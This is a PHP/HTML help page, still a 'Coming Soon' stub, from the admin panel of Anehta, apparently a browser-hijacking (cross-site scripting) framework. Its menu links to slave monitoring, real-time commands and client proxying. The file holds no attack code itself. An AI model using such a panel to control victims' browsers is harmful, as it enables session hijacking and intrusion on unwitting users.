<?php
  //加载auth类
  include_once("class/auth_Class.php");

  header("Content-Type: text/html; charset=utf-8");
  
  checkLoginStatus();
?>
<html>
<head>
		<title>
			Anehta!
		</title>
	  <script src="../library/anehta.js" ></script>
	  <script src="../library/jQuery.js" ></script>
	  <script src="../server/js/effects.core.js"></script>
	  <script src="../server/js/ui.core.js"></script>
	  <script src="../server/js/effects.bounce.js"></script>
	  <script src="../server/js/effects.slide.js"></script>
	  <script src="../server/js/effects.shake.js"></script>
	  <!-- script src="../server/js/effects.explode.js"></script -->
	  <script src="../server/js/effects.clip.js"></script>
	  <script src="../server/js/ui.accordion.js"></script>
	  <script src="../server/js/ui.draggable.js"></script>
	  <script src="../server/js/ui.dialog.js"></script>
	  <script src="../server/js/ui.resizable.js"></script>	  
	  
	  <!-- 加载 JSONER -->
	  <script src="../server/js/_compressed_jsoner.commons.js"></script>
    <script src="../server/js/_compressed_jsoner.js"></script>
    <script src="../server/js/_compressed_jsoner.serializer.js"></script>
    <script src="../server/js/jsoner.undomanager.js"></script>
    <script src="../server/js/jsoner.updater.js"></script>	  
	  
	  <script src="../server/js/loadData.js"></script>
	  <link rel="stylesheet" type="text/css" href="css/style.css" />
  </head>
<body onload="return initData();">


<img id="logo" style="float:top;z-index: 19999" src="../server/img/logo.jpg" />	
<ul id="basictab" class="basictab">	
<li style="margin: 0 0 0 188px;"><a href="../server/admin.php">Home</a></li>
<li><a href="../server/slavemonitor.php">Slave Monitor</a></li>
<li><a href="../server/rtcmd.php">RealTime CMD</a></li>
<li><a href="../server/clientproxy.php">Client Proxy</a></li>
<li><a href="../server/onlineproxy.php">Online Proxy</a></li>
<li><a href="../server/config.php">Configure</a></li>
<li class="selected" ><a href="../server/help.php">Help</a></li>
<a href="../server/logout.php">Logout</a>
</ul>


<div class="wireframemenu" style="float:left;">
<ul>
<li><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
</ul>
</div>

<center>Coming Soon......</center>

<div align="center">	
	 <!--footer-->
  <div class="clear">
    <div class="line2">
    </div>
    <div class="clear">
      <label for="foot" style="color: #666666; font-size: 14px;">&copy;2008 <a href="http://anehta.googlecode.com">Anehta</a></label>
    </div>
  </div>
</div>

</body>
</html>